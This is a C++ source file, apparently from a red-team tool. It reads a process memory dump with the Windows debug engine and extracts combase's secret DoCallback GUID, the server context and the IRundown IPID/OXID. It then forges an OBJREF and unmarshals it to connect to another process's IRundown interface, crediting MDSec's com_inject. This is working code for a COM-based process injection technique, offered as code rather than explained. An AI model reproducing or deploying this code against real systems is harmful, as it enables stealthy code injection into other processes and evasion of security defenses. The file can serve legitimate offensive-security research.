#include "StdAfx.h"
#include "com.h"
#include "utils.h"


DEBUG_INTERFACES DebugInterfaces{};

std::wstring base64_encode(PVOID inbuf, DWORD inlen) {
    // Get the length of output
    DWORD outlen;

    CryptBinaryToStringW(
        (const PBYTE)inbuf,
        inlen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL,
        &outlen
    );

    std::wstring outbuf(outlen - 1, L'\0');

    CryptBinaryToStringW(
        (const PBYTE)inbuf,
        inlen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        &outbuf[0],
        &outlen
    );

    return outbuf;
}

bool
DumpInitializeUtils(
    _In_ PCSTR DumpFile)
{
    bool status = false;
    HRESULT hr{};

    hr = DebugCreate(__uuidof(IDebugClient), (void**)&DebugInterfaces.pDebugClient);
    if (FAILED(hr)) {
        return false;
    }

    hr = DebugInterfaces.pDebugClient->OpenDumpFile(DumpFile);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = DebugInterfaces.pDebugClient->QueryInterface(__uuidof(IDebugControl3), (void**)&DebugInterfaces.pDebugControl);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = DebugInterfaces.pDebugControl->WaitForEvent(DEBUG_WAIT_DEFAULT, INFINITE);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = DebugInterfaces.pDebugClient->QueryInterface(__uuidof(IDebugAdvanced), (void**)&DebugInterfaces.pDebugAdvanced);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = DebugInterfaces.pDebugClient->QueryInterface(__uuidof(IDebugDataSpaces), (void**)&DebugInterfaces.pDebugDataSpaces);
    if (FAILED(hr)) {
        goto cleanup;
    }

    DebugInterfaces.initialized = status = true;

cleanup:
    if (!status) {
        RtlSecureZeroMemory(&DebugInterfaces, sizeof(DEBUG_INTERFACES));
    }

    return status;
}

static
BOOL
DumpGetIIDEntry(_In_ IID iid, _In_ ULONG64 PageAllocator, _Out_ IPIDEntry* OutEntry)
{
    BOOL status = FALSE;
    CPageAllocator* cPageAllocator{};

    if (!OutEntry || !PageAllocator) {
        return status;
    }
    *OutEntry = {};

    // Lamda read helper
    auto readMem = [&](ULONG64 addr, void* out, ULONG size) -> bool {
        ULONG readed = 0;
        HRESULT hr = DebugInterfaces.pDebugDataSpaces->ReadVirtual(addr, out, size, &readed);
        if (FAILED(hr) || readed != size) {
            printf("Error reading memory at 0x%llx: (0x%x)\n", addr, hr);
            return false;
        }
        return true;
        };

    cPageAllocator = (CPageAllocator*)PageAllocator;

    // Read internal allocator
    CInternalPageAllocator InternalPageAllocator{};
    if (!readMem((ULONG64)&cPageAllocator->_pgalloc, &InternalPageAllocator, sizeof(InternalPageAllocator))) {
        DebugInterfaces.pDebugClient->Release();
        return status;
    }

    const ULONG64 cPages = InternalPageAllocator._cPages;
    const USHORT  entriesPerPage = InternalPageAllocator._cEntriesPerPage;
    const ULONG64 cbPerEntry = InternalPageAllocator._cbPerEntry;
    const ULONG64 pageList = (ULONG64)InternalPageAllocator._pPageListStart;   // array of tagPageEntry*
    const ULONG64 entryBase = 0;
    IPIDEntry entry{};

    for (unsigned long long p = 0; p < cPages; ++p) {
        unsigned long long pagePtr = 0;
        if (!readMem(pageList + p * sizeof(void*), &pagePtr, sizeof(pagePtr)) || pagePtr == 0)
            continue;

        for (unsigned short e = 0; e < entriesPerPage; ++e) {
            ULONG64 entryAddr = pagePtr + entryBase + (ULONG64)e * cbPerEntry;
            if (!readMem(entryAddr, &entry, sizeof(entry)))
                continue;

            // skip free slots
            if (entry.pStub == nullptr && entry.pv == nullptr)
                continue;

            if (entry.iid == iid) {
                *OutEntry = entry;
                status = TRUE;
            }
        }
    }

    return status;
}

BOOL
DumpGetIRundownParameters(
    _Out_ PIR_PARAMETERS pParam)
{
    LOCAL_COM_OFFSETS offsets{};
    CPageAllocator* cPageAllocator = (CPageAllocator*)offsets.IpidTable;
    ULONG bytesRead = 0;

    if (!pParam) {
        return FALSE;
    }
    *pParam = {};

    if (!DebugInterfaces.initialized) {
        return FALSE;
    }

    if (!GetLocalComOffsets(&offsets)) {
        return FALSE;
    }

    HRESULT hr = DebugInterfaces.pDebugDataSpaces->ReadVirtual(offsets.DoCallbackSecretGuid, &pParam->secretGUID, sizeof(GUID), &bytesRead);
    if (FAILED(hr)) {
        printf("[-] Error reading memory secret GUID: (0x%x)\n", hr);
        return FALSE;
    }

    hr = DebugInterfaces.pDebugDataSpaces->ReadVirtual(offsets.DoCallbackServerCtx, &pParam->pContext, sizeof(PVOID), &bytesRead);
    if (FAILED(hr)) {
        printf("[-] Error reading memory pContext: (0x%x)\n", hr);
        return FALSE;
    }

    // Locating IPID starting from 'combase!CIPIDTable::_palloc'
    IPIDEntry IpidEntry{};
    if (!DumpGetIIDEntry(IID_IRundown, offsets.IpidTable, &IpidEntry)) {
        printf("[-] Error searching IPID entry.\n");
        return FALSE;
    }

    pParam->myIPID = IpidEntry.ipid;

    // Reading OXID pointer in IPID
    OXIDEntry OxidEntry{};
    hr = DebugInterfaces.pDebugDataSpaces->ReadVirtual((ULONG64)IpidEntry.pOXIDEntry, &OxidEntry, sizeof(OxidEntry), &bytesRead);
    if (FAILED(hr)) {
        printf("[-] Error reading OXID entry.\n");
        return FALSE;
    }

    RtlCopyMemory(&pParam->_moxid, &OxidEntry.moxid, sizeof(_moxid));

    return TRUE;
}

BOOL
DumpGetRemoteSection(
    _In_ PVOID pPattern,
    _In_ ULONG szPattern,
    _Out_ PVOID* pRemoteSection)
{
    HRESULT hr{};
    ULONG64 offset{};

    if (!pRemoteSection) {
        return FALSE;
    }
    *pRemoteSection = nullptr;

    if (!DebugInterfaces.initialized) {
        return FALSE;
    }

    hr = DebugInterfaces.pDebugDataSpaces->SearchVirtual(0, 8000000000000000, pPattern, szPattern, 1, &offset);
    if (FAILED(hr) || offset <= 0) {
        printf("[-] Error searching memory for pattern GUID: (0x%x)\n", hr);
        return FALSE;
    }

    *pRemoteSection = (void*)(offset - szPattern);

    return TRUE;
}

// This searches the secret GUID in the .data section of the current process combase.dll.
// It will search for a pattern and store the address once found. 
// The address can be used to read the GUID from the dump.
static
void*
SearchPatternInCombaseDataSection(_In_ void* pattern, _In_ SIZE_T szPattern)
{
    MODULE_SECTION_INFORMATION moduleInfo{};
    void* result = nullptr;

    if (!ResolveModuleSectionBase(L"combase.dll", ".data", &moduleInfo)) {
        return nullptr;
    }

    for (unsigned long i = 0; i < moduleInfo.sectionVirtualSize - sizeof(unsigned long); i += sizeof(unsigned long)) {
        if (!memcmp((void*)((PBYTE)moduleInfo.sectionBase + i), pattern, szPattern)) {
            result = Add2Ptr(moduleInfo.sectionBase, i);
            break;
        }
    }

    return result;
}

static
void*
GetIPIDTable()
{
    MODULE_SECTION_INFORMATION moduleInfo{};
    void* result = nullptr;

    if (!ResolveModuleSectionBase(L"combase.dll", ".data", &moduleInfo)) {
        return nullptr;
    }

    auto ds = (PULONG_PTR)moduleInfo.sectionBase;
    unsigned long cnt = (moduleInfo.sectionVirtualSize - sizeof(CPageAllocator)) / sizeof(ULONG_PTR);

    for (unsigned long i = 0; i < cnt; i++) {

        auto cPageAllocator = (CPageAllocator*)&ds[i];

        if (cPageAllocator->_pgalloc._cbPerEntry >= 0x70) {
            if (cPageAllocator->_pgalloc._cEntriesPerPage != 0x32) continue;
            if (cPageAllocator->_pgalloc._pPageListEnd <= cPageAllocator->_pgalloc._pPageListStart) continue;
            result = &ds[i];
            break;
        }
    }

    return result;
}

// Credits https://github.com/mdsecactivebreach/com_inject/blob/main/com_inject.cpp#L120
bool
GetLocalComOffsets(_Inout_ PLOCAL_COM_OFFSETS pOffsets)
{
    bool status = false;
    bool initialized = false;

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return false;
    }

    initialized = true;

    //
    // Get pointer to IMarshalEnvoy interface.
    //
    void* addrOfGuid = nullptr;
    void* addrOfContext = nullptr;
    ULONGLONG dataAddr{};
    ULONGLONG ipid_tbl{};
    DWORD sizeData = 0;
    IMarshalEnvoy* e = nullptr;
    hr = CoGetObjectContext(IID_IMarshalEnvoy, (PVOID*)&e);
    if (FAILED(hr)) {
        printf("[-] CoGetObjectContext(IID_IMarshalEnvoy) failed\n");
        return false;
    }
    void* a = nullptr;
    //
    // Marshal the context header.
    // It should contain the secret GUID and heap address of server context.
    //
    IStream* s = SHCreateMemStream(NULL, 0);
    LARGE_INTEGER pos{};
    tagCONTEXTHEADER hdr{};
    DWORD cbBuffer = 0;
    hr = e->MarshalEnvoy(s, MSHCTX_INPROC);
    if (FAILED(hr)) {
        printf("[-] IMarshalEnvoy::MarshalEnvoy() failed");
        goto cleanup;
    }

    //
    // Read the context header into local buffer.
    //
    pos.QuadPart = 0;
    hr = s->Seek(pos, STREAM_SEEK_SET, NULL);
    if (FAILED(hr)) {
        printf("[-] IStream::Seek() failed");
        goto cleanup;
    }

    hr = s->Read(&hdr, sizeof(hdr), &cbBuffer);
    if (FAILED(hr)) {
        printf("[-] IStream::read(tagCONTEXTHEADER) failed");
        goto cleanup;
    }

    addrOfGuid = SearchPatternInCombaseDataSection(&hdr.ByRefHdr.guidProcessSecret, sizeof(GUID));
    if (!addrOfGuid) {
        printf("[-] DoCallback GUID not found in current process.\n");
        goto cleanup;
    }

    pOffsets->DoCallbackSecretGuid = (ULONGLONG)addrOfGuid;
    //*addrOfSecret = (ULONGLONG)addrOfGuid;

    addrOfContext = SearchPatternInCombaseDataSection(&hdr.ByRefHdr.pServerCtx, sizeof(PVOID));
    if (!addrOfContext) {
        printf("[-] DoCallback Server Context not found in current process.\n");
        goto cleanup;
    }

    pOffsets->DoCallbackServerCtx = (ULONGLONG)addrOfContext;
    //*serverContext = (ULONGLONG)addrOfContext;

    ipid_tbl = (ULONGLONG)GetIPIDTable();
    if (!ipid_tbl) {
        printf("[-] DoCallback IPID Table not found in current process.\n");
        goto cleanup;
    }

    pOffsets->IpidTable = (ULONG64)ipid_tbl;
    //*symbolOffset = ipid_tbl;

    status = true;

cleanup:
    if (s) s->Release();
    if (e) e->Release();
    if (initialized) CoUninitialize();

    return status;
}

void*
IRundownConnect(_In_ PIR_PARAMETERS pRundownParams)
{
    OBJREF objRef{};
    HRESULT hr{};
    void* result = nullptr;

    if (!pRundownParams) {
        return nullptr;
    }

    objRef.signature = OBJREF_SIGNATURE;
    objRef.flags = OBJREF_STANDARD;
    objRef.iid = IID_IRundown;

    objRef.u_objref.u_standard.std.flags = 0;
    objRef.u_objref.u_standard.std.cPublicRefs = 5;
    objRef.u_objref.u_standard.std.oxid = pRundownParams->_moxid.q[0];
    objRef.u_objref.u_standard.std.oid = pRundownParams->_moxid.q[0];
    objRef.u_objref.u_standard.std.ipid = pRundownParams->myIPID;
    objRef.u_objref.u_standard.saResAddr.wNumEntries = 0;
    objRef.u_objref.u_standard.saResAddr.wSecurityOffset = 0;

    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[-] Error while connecting to IRundown.\n");
        return nullptr;
    }

    IStream* pstm = SHCreateMemStream(nullptr, 0);
    hr = pstm->Write(&objRef, sizeof(objRef), nullptr);
    if (FAILED(hr)) {
        printf("[-] Error while connecting to IRundown.\n");
        return nullptr;
    }

    LARGE_INTEGER pos{};
    hr = pstm->Seek(pos, STREAM_SEEK_SET, nullptr);
    if (FAILED(hr)) {
        printf("[-] Error while connecting to IRundown.\n");
        return nullptr;
    }

    //
    // Connect.
    //
    hr = CoUnmarshalInterface(pstm, IID_IRundown, (void**)&result);
    if (FAILED(hr)) {
        printf("[-] Error while connecting to IRundown.\n");
        return nullptr;
    }

    pstm->Release();

    return result;
}
